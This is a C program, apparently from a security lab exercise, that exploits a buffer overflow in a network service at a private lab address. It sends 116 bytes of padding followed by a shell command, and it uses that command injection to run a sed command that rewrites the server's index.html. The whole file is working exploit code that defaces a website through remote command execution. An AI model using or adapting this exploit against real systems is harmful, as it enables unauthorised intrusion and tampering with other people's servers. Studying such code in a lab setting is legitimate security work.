#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#define EXPLOIT_STRING "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
#define EXPLOIT_SIZE 116
#define CMD_SIZE 128

#define IP "192.168.56.101"
#define PORT 1234
#define BUF_SIZE 2048

void reconnect(int *socket_fd, struct sockaddr_in *address){
	close(*socket_fd);

	*socket_fd = socket(AF_INET, SOCK_STREAM, 0);

	if(connect(*socket_fd, (struct sockaddr *) address, sizeof(struct sockaddr_in)) != 0){
		printf("Error connecting to server\n");
	}
	
	//Evacuate the "What's your name" string
	char buf[BUF_SIZE];
	recv(*socket_fd, buf, BUF_SIZE, 0);
}

int command_injector(int *socket_fd, char *cmd, struct sockaddr_in *adress){
	//the command shoudln't be too long as not to overflow buffer
	
	char *command_string = (char *) malloc(sizeof(char)*(CMD_SIZE+EXPLOIT_SIZE));
	strncat(command_string, EXPLOIT_STRING, EXPLOIT_SIZE);
	strncat(command_string+EXPLOIT_SIZE, cmd, CMD_SIZE);

	send(*socket_fd, command_string, EXPLOIT_SIZE+CMD_SIZE, 0);

	char buf[BUF_SIZE];
	recv(*socket_fd, buf, BUF_SIZE, 0);
	
	printf("buffer is : %s\n", buf);

	reconnect(socket_fd, adress);

	free(command_string);
	return 0;
}



int main(){
	struct sockaddr_in serv_address;
	serv_address.sin_family = AF_INET;
	serv_address.sin_port = htons(PORT);
	serv_address.sin_addr.s_addr = inet_addr(IP);

	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if(socket_fd == -1){
		printf("Error creating socket\n");
		return 1;
	}

	if(connect(socket_fd, (struct sockaddr *)&serv_address, sizeof(struct sockaddr_in)) != 0){
		printf("Error connecting to server on first try\n");
		return 2;
	}

	char buf[BUF_SIZE];
	recv(socket_fd, buf, BUF_SIZE, 0); //Evacuate the "What's your name" string


	//Retrieve website code :
	int boolean_value = 1;
	
	while(boolean_value){
		printf("Type name to be added to the list : (Mustn't be too long)\n");
		char *name;
		scanf("%ms", &name);
		char *cmd = (char *)malloc(sizeof(char) * CMD_SIZE);
		snprintf(cmd, CMD_SIZE, "sed -i \'s/<\\\/body>/%s\\n&<\\\/body>/\' var/www/html/index.html", name);
		command_injector(&socket_fd, cmd, &serv_address);

		free(cmd);

		printf("Add another name ? (0/1)\n");
		scanf("%d", &boolean_value);
	}
	

	close(socket_fd);
	return 0;
}
